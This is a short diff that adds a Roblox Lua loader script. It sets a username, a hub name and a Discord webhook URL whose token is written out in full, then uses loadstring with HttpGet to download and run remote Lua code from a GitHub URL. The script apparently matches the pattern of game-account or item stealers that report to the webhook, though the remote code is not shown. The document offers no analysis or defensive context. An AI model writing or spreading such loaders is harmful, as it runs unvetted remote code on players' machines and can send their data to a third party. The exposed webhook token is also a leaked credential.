@@ -1,0 +1,5 @@
+_G.Username "freefire0vv"
+_G.HubName "milk hub"
+_G.WebhookUrl "https://discord.com/api/webhooks/1151397113868070982/6DXoqDgYG2wcNnAbIC70-Njf8J_sc35bw-_2ULtlowjTsAGQLQpqXtkqYx1CWG6QlR_U"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
